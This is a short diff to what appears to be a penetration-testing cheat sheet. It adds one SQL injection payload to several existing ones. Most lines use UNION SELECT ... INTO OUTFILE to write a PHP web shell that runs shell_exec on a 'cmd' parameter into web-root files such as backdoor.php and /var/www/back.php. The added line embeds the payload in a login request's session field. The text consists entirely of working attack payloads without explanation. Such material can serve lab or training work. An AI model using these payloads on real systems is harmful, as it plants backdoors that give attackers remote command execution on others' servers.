@@ -26,3 +26,4 @@ Databases present in mysql:
 http://10.11.11.137/comment.php?id=773 union all select 1,2,3,4,db,6 from mysql.db
  union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
  q=f&lang=en' union all select "<?php echo  shell_exec($_GET['cmd']);?>",2,3,4,5,6 into OUTFILE 'c:/xampp/htdocs/post.php
+ target=auth&mode=login&csid=4d96950c4ae2b22166e6e1hb6101d185'  union all select "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/var/www/back.php'#&redirect_url=index.php&user_login=admin&password=admin
